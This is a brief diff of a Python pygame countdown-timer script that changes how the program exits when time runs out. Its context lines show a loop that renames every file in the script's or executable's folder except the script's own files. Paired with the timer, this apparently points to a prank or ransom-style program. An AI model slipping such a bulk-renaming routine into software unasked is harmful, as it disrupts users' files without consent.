@@ -56,7 +56,7 @@ if getattr(sys, "frozen", False):
     file_path = Path(sys.executable).parent
 else:
     file_path = Path(__file__).parent
-    
+
 for file in file_path.iterdir():
     if file.is_file() and file.name not in script_files:
         new = file.with_name(
@@ -107,8 +107,7 @@ while running:
 
     # Stuff when timer runs out
     if remaining <= 0:
-        pygame.quit()
-        sys.exit()
+        running = False
 
     timer_text = font.render(
         f"{minutes:02d}:{seconds:02d}",
